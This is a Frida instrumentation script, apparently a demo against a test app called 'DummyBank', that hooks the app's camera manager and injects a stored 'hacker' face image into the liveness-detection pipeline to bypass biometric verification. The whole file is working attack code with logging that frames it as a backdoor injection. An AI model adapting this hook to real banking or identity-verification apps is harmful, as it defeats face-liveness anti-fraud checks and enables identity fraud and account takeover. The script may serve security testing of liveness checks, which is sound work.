/**
 * Sentinel Hook - Enterprise Camera Injector
 * Phase 3.0: Stealth AVCaptureSession Bypass (Simulator & Physical safe)
 */

if (ObjC.available) {
    console.log("[🌟] SENTINEL SUBSYSTEM: Initiating Camera Flow Override (AVCaptureSession)");

    var targetClassName = "_TtC9DummyBank13CameraManager";
    var triggerMethod = "- simulateFrameTrigger";

    try {
        var AppCameraManager = ObjC.classes[targetClassName];
        
        if (AppCameraManager) {
            console.log("[+] TARGET LOCKED: " + targetClassName + " mapped in memory.");
            var lastLogTime = 0;

            Interceptor.attach(AppCameraManager[triggerMethod].implementation, {
                onEnter: function(args) {
                    var now = Date.now();
                    if (now - lastLogTime > 2000) {
                        console.log("\n[💥] SENTINEL SENSOR LINK: Intercepting raw video feed...");
                        
                        var cameraManagerInstance = new ObjC.Object(args[0]);
                        console.log("    -> Action: Injecting synthetic frame payload into Liveness pipeline!");
                        
                        var hackerImagePath = "/Users/kadirarici/Desktop/Biometric Logic Bypass/Sentinel_Hook/.local/test-faces/hacker.jpg";
                        var nsStringPath = ObjC.classes.NSString.stringWithString_(hackerImagePath);
                        
                        // Execute backdoor injection
                        cameraManagerInstance["- receiveHackerImage:"](nsStringPath);
                        console.log("[✅] OVERRIDE: Synthesization complete. Virtual feed active.");
                        lastLogTime = now;
                    }
                }
            });
        } else {
            console.log("[-] WARNING: Target CameraManager class not found. Deferring to stealth loop...");
        }
    } catch (err) {
         console.log("[-] FATAL: Failed to hook Camera subsystem - " + err.message);
    }
} else {
    console.log("[-] FATAL: Objective-C Runtime unavailable.");
}
